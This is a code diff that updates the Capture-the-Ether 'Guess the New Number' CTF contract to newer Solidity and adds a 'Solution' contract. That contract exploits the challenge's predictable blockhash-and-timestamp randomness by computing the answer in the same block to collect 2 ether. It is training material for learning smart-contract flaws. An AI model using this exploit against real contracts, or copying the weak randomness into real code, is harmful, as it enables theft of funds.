@@ -1,9 +1,11 @@
 // SPDX-License-Identifier: UNLICENSED
+//CHECK ON REMIX IDE THE CHALLENGES.SOL 
 
-pragma solidity ^0.4.21;
+pragma solidity ^0.8.12;
 
-contract GuessTheNewNumberChallenge {
-    function GuessTheNewNumberChallenge() public payable {
+
+contract GuessTheNC {
+    constructor() payable {
         require(msg.value == 1 ether);
     }
 
@@ -11,12 +13,36 @@ contract GuessTheNewNumberChallenge {
         return address(this).balance == 0;
     }
 
-    function guess(uint8 n) public payable {
-        require(msg.value == 1 ether);
-        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
+    function guess(uint256 n) public payable {
+        require(msg.value == 1 ether, "GTNC: Please sent 1 ether");
+        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
 
         if (n == answer) {
-            msg.sender.transfer(2 ether);
+            (bool success, ) = payable(msg.sender).call{value: 2 ether}("");
+            require(success);
         }
     }
+
+}
+
+contract Solution{
+
+    GuessTheNC public lottery;
+
+    constructor(GuessTheNC _contract) {
+        lottery = _contract;
+    }
+
+    function solve() public payable{
+        bytes32 solutionHash = keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp));
+        uint256 solution = uint256(solutionHash);
+        bytes memory data = abi.encodeWithSignature("guess(uint256)",solution);
+        (bool success, ) = address(lottery).call{value: 1 ether, gas: 3000000}(data);
+        require(success, "Solution failed");
+    }
+
+    receive () external payable{
+
+    }
+
 }
